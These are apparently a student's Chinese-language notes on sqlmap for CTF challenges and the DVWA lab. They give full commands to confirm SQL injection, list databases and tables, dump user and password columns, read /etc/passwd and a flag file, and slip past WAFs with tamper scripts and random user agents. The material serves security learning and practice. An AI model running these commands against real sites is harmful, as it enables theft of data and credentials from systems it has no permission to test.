# sqlmap 

##  第一步：基础扫描

```bash
sqlmap -u "http://challenge.qsnctf.com:44089/?id=1" --batch
```

运行后会输出很多内容，**只需要关注这几块：**

---

##  如何看输出结果

###  1. 确认是否存在注入
找到这样的字样就说明**注入成功**：
```
Parameter: id (GET)
    Type: boolean-based blind
    Type: time-based blind
    Type: UNION query          ← 有这个最好！可以直接查数据
```
> 没有任何 `Type` 出现 = 不存在注入

---

###  2. 确认数据库信息
```
[INFO] the back-end DBMS is MySQL
web server operating system: Linux
web application technology: Nginx, PHP 7.3.22
back-end DBMS: MySQL >= 5.0
```
> 这里告诉你：数据库类型、系统、PHP版本

---

###  3. 常用后续命令

```bash
# 查所有数据库名
sqlmap -u "http://xxx/?id=1" --batch --dbs

# 查指定数据库的表
sqlmap -u "http://xxx/?id=1" --batch -D word --tables

# 查指定表的字段
sqlmap -u "http://xxx/?id=1" --batch -D word -T articles --columns

# 直接dump所有数据
sqlmap -u "http://xxx/?id=1" --batch -D word -T articles --dump

# 读取服务器文件
sqlmap -u "http://xxx/?id=1" --batch --file-read="/etc/passwd"
```

---

##  完整思路流程图

```
开始
 │
 ▼
sqlmap 基础扫描 (-u --batch)
 │
 ├─ 有注入？
 │    │
 │    ▼
 │   --dbs 查所有数据库
 │    │
 │    ▼
 │   -D 库名 --tables 查所有表
 │    │
 │    ▼
 │   -D 库名 -T 表名 --dump 拿数据
 │
 └─ 没有flag？
      │
      ▼
     --file-read 读文件系统
      │
      ▼
     load_file('/flag') 直接读flag
```

---

##  常见参数速查表

| 参数 | 作用 |
|------|------|
| `-u` | 指定目标URL |
| `--batch` | 全程自动选择，不用手动确认 |
| `--dbs` | 列出所有数据库 |
| `-D 库名` | 指定数据库 |
| `--tables` | 列出所有表 |
| `-T 表名` | 指定表 |
| `--columns` | 列出所有字段 |
| `--dump` | 导出数据 |
| `--file-read` | 读取服务器文件 |
| `--level` | 检测深度 1-5，默认1 |
| `--risk` | 风险等级 1-3，默认1 |
| `--proxy` | 挂代理（如Burp） |

---

>  **顺序：扫描 → dbs → tables → columns → dump**
> 找不到flag再用 `--file-read` 读文件！









# 🗺️ SQLMap 使用思路全解

## 📌 核心思维流程

```
发现注入点 → 确认注入 → 获取数据库信息 → 获取表 → 获取列 → 拖数据
```

---

## 🔧 第一阶段：基础探测

### 最简单的起手式
```bash
# GET 请求
sqlmap -u "http://target.com/page.php?id=1"

# POST 请求
sqlmap -u "http://target.com/login.php" --data="user=1&pass=2"

# 需要登录的页面（带Cookie）
sqlmap -u "http://target.com/page.php?id=1" \
--cookie="PHPSESSID=abc123; security=low"
```

---

## 🎯 第二阶段：重要参数理解

### 指定注入点
```bash
-p id                    # 指定测试 id 参数
--dbms=mysql             # 指定数据库类型（加速测试）
--level=1~5              # 测试深度，默认1，越高越慢越全
--risk=1~3               # 风险等级，默认1，3会用UPDATE等危险语句
```

### 判断成功的依据
```bash
--string="First name"    # 页面有这个字符串 = 注入成功
--not-string="error"     # 页面没有这个字符串 = 注入成功
--code=200               # HTTP状态码判断
```

### 绕过过滤
```bash
--tamper=space2comment   # 空格换成/**/
--tamper=between         # > 换成 BETWEEN
--tamper=randomcase      # 随机大小写 SeLeCt
--tamper=base64encode    # base64编码
--random-agent           # 随机UA，绕WAF
```

---

## 📊 第三阶段：数据提取

```bash
# 第一步：拿所有数据库名
--dbs

# 第二步：拿指定数据库的表
-D dvwa --tables

# 第三步：拿指定表的列
-D dvwa -T users --columns

# 第四步：拿数据 🏆
-D dvwa -T users -C user,password --dump
```

---

## 🚀 第四阶段：进阶操作

### 从 Burp 请求包直接注入
```bash
# 先在Burp里把请求包保存为 req.txt
sqlmap -r req.txt --dbs
```
> 💡 **最推荐的方式！** 不用手动拼Cookie和参数

### 批量自动化
```bash
--batch          # 所有提示自动选Yes
--threads=10     # 10线程并发（加速）
--timeout=10     # 超时时间
--retries=3      # 失败重试次数
```

### 结果输出
```bash
--output-dir=/tmp/result   # 指定输出目录
--dump-all                 # 拖所有数据库数据（慎用）
```

---

## 🎯 针对 DVWA 的完整命令

### Low 级别
```bash
sqlmap -u "http://192.168.15.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=70043953d7e36a5c5b863653d1f4620f" \
--dbms=mysql \
--string="First name" \
--batch \
-D dvwa -T users -C user,password --dump
```

### Medium 级别（数字型）
```bash
sqlmap -u "http://192.168.15.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=70043953d7e36a5c5b863653d1f4620f" \
--dbms=mysql \
--level=2 \
--batch \
--dbs
```

---

## ⚠️ 常见问题速查

| 问题 | 原因 | 解决方法 |
|------|------|---------|
| `not injectable` | 参数没漏洞 / 被WAF拦 | 加 `--tamper` 或换参数 |
| 跑很慢 | level/risk太高 | 先用默认值 |
| 需要登录 | 没带Cookie | 加 `--cookie` |
| POST请求 | 参数在body里 | 用 `--data` 或 `-r` |
| 有WAF | 请求被拦截 | 加 `--random-agent --tamper` |

---

## 💡 总结：实战优先级

```
1. 用 Burp 抓包保存为 req.txt
2. sqlmap -r req.txt --batch --dbs        ← 先探库
3. sqlmap -r req.txt -D xxx --tables      ← 再探表
4. sqlmap -r req.txt -D xxx -T yyy --dump ← 最后拖数据
```

> 🔑 **记住：`-r req.txt` 是最省心的方式，不用管Cookie和参数格式！**